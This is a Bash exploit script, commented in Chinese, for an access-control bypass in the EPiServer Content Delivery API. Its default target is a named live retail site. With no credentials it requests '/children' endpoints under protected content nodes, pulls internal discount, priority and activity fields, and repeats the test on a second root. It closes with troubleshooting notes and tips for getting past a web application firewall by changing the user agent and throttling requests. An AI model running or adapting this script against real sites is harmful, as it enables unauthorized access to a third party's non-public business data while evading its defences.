#!/usr/bin/env bash
# EPiServer Content Delivery API v2 —— 父级 ACL 不套用到 children 的未授权读取
# 用法: T=https://<target> [PREFIX=/api/episerver/v2.0] bash episerver_cd_children_acl_bypass.sh
# 全程只读，无需任何 Cookie / Authorization / XSRF。

set -u
T="${T:-https://www.greenmangaming.com}"
PREFIX="${PREFIX:-/api/episerver/v2.0}"
B="${T%/}${PREFIX}"
UA="${UA:-Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36}"

req() { curl -sk --max-time 30 -A "$UA" -H 'Accept: application/json' \
        -o "$2" -w '%{http_code} %{size_download}' "$1"; }

echo "== 0. 指纹/探活 =="
code=$(req "$B/content/1" /tmp/epi_c1)
echo "GET /content/1 -> $code"
# 403 Access denied 或 200 JSON 均说明 CD API 存在；404 多半没开或前缀不同。

echo
echo "== 1. 阴性对照：受保护根节点单条 =="
code=$(req "$B/content/5" /tmp/epi_c5)
echo "GET /content/5 -> $code"
body5=$(cat /tmp/epi_c5)
echo "  body: ${body5:0:160}"

echo
echo "== 2. 命中：同 id 的 children 列表 =="
code=$(req "$B/content/5/children" /tmp/epi_c5kids)
echo "GET /content/5/children -> $code"
python3 - <<'PY'
import json
try:
    d = json.load(open('/tmp/epi_c5kids'))
except Exception as e:
    print('  not json:', e); raise SystemExit
if isinstance(d, list):
    print('  items:', len(d))
    for x in d[:3]:
        cl = x.get('contentLink') or {}
        print('  -', cl.get('id'), x.get('name'),
              x.get('contentType'),
              (x.get('validFrom') or {}).get('value'),
              'isActive=', (x.get('isActive') or {}).get('value'))
else:
    print('  body:', str(d)[:300])
PY

echo
echo "== 3. 逐级下钻：读子项明细（父级不可见的商务字段）=="
for id in $(python3 -c "import json;d=json.load(open('/tmp/epi_c5kids'));print(' '.join(str((x.get('contentLink') or {}).get('id')) for x in d[:3]) if isinstance(d,list) else '')" 2>/dev/null); do
  [ -z "$id" ] && continue
  code=$(req "$B/content/$id/children" "/tmp/epi_kids_$id")
  echo "GET /content/$id/children -> $code"
  python3 - "$id" <<'PY'
import json,sys
i=sys.argv[1]
try: d=json.load(open(f'/tmp/epi_kids_{i}'))
except Exception: raise SystemExit
if not isinstance(d,list): raise SystemExit
print('  items:',len(d))
for x in d[:3]:
    print('  -',x.get('name'),
          '| publisherDiscountPercentage=',(x.get('publisherDiscountPercentage') or {}).get('value'),
          '| gmgDiscountPercentage=',(x.get('gmgDiscountPercentage') or {}).get('value'),
          '| priority=',(x.get('priority') or {}).get('value'),
          '| isActive=',(x.get('isActive') or {}).get('value'))
PY
done

echo
echo "== 4. 第二个根节点复现（证明是通用实现问题，非单点）=="
code=$(req "$B/content/1" /tmp/epi_r1);  echo "GET /content/1 -> $code $(head -c 100 /tmp/epi_r1)"
code=$(req "$B/content/1/children" /tmp/epi_r1k); echo "GET /content/1/children -> $code"
python3 - <<'PY'
import json
try: d=json.load(open('/tmp/epi_r1k'))
except Exception: raise SystemExit
print('  items:',len(d) if isinstance(d,list) else 'n/a')
if isinstance(d,list):
    for x in d[:5]:
        cl=x.get('contentLink') or {}
        print('  -',cl.get('id'),x.get('name'),x.get('contentType'),x.get('status'))
PY

cat <<'EOF'

== 判定 ==
命中 = 受保护/前台不可见的父节点单条为 403（或不存在），但其 /children 返回 200 非空数组，
     且数组内 contentLink.id 可继续下钻取出内部字段（时间窗 / isActive / 折扣 / priority 等）。

常见失败原因：
- /content/{id}/children 也 403 → 实例已修复或该节点子级另有 ACL（换个根节点再试）。
- 200 但 body 为 [] → 该 id 就是空节点（如站点根下的 2/3/4），换 id。
- 404 → CD API 未启用 / 前缀不是 /api/episerver/v2.0（试 v3.0，或在页面 JS/HTML 里 grep episerver）。
- 401 → 实例要求 access token / scope（EPiServer CD API 可选鉴权）。
- 406 / 403 无 body → 边缘 WAF 按 UA 拦截，换浏览器 UA、降速（单线程、间隔 ≥1s）。

已确认的边界（不要浪费时间）：
- workId / epieditmode / preview 参数被忽略，读不到草稿版本。
- ?select=all 不增加字段；返回字段由内容类型固定的属性集决定。
- 无需任何凭据即可一直读到 Published 状态的子内容；2016 年的旧内容仍在线可读。
EOF